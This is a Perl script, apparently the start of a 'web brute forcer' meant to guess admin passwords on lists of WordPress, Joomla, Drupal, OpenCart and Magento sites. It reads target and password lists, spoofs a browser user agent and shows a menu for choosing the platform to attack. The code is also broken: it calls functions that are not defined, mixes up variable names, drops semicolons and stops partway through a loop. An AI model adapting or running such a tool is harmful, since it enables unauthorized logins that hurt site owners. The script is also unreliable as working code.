#!/usr/bin/perl

use if $^O eq "MSWin32", Win32::Console::ANSI;
use Term::ANSIColor;
use URI::URL;
use Getopt::Long;
use LWP::UserAgent;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

if ($^0 =~ /MSWin32/) {system("cls"); }else { system("clear"); }

GetOptions(
    "l|list=s" => \$list,
    "p|passwords=s" => \$pass,
);

banner();

unless ($list|$pass) { help(); }
if ($list|$pass) { webbrute(); }

sub banner() {
    print color('bold red'), "WEB BRUTE FORCER";
    print color('bold white'), "FOR WordPress , Joomla , DruPal , OpenCart , Magento";
    print color('reset');
};

sub help() {
print q(
    Usage: perl bruteforcer.pl -l list.txt -p passwords.txt

    options:
    -l => websits list
    -p => passwords list
);
}

sub bruteforcer{
print color('bold red')," [";
print color('bold green'),"1";
print color('bold red'),"]";
print color('bold white')," WordPress \n";
print color('bold red')," [";
print color('bold green');
print color('bold green'),"2";
print color('bold red'),"]";
print color('bold white')," Joomla \n";
print color('bold red')," [";
print color('bold green'),"3";
print color('bold red'),"]";
print color('bold white')," DruPal \n";
print color('bold red')," [";
print color('bold green'),"4";
print color('bold red'),"]";
print color('bold white')," OpenCart \n";
print color('bold red')," [";
print color('bold green'),"5";
print color('bold red'),"]";
print color('bold white')," Magento \n";
print color('bold red')," [";
print color('bold green'),"6";
print color('bold red'),"]";
print color('bold white')," Auto \n";
print color('bold red')," [";
print color('bold green'),"+";
print color('bold red'),"]";
print color('bold white')," Choose Number : ";

my $Number = <STDIN>;
chomp $number;
print "\n"
if($number eq '1')
{
    open(THETARGET, "<$list") || die "cant open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
    chomp($site);
    print color('bold red'), "\n [";
    print color('bold green'), "+";
    print color('bold red'), "] "
    print color('bold red'),"$site",
    wpuser();
}
}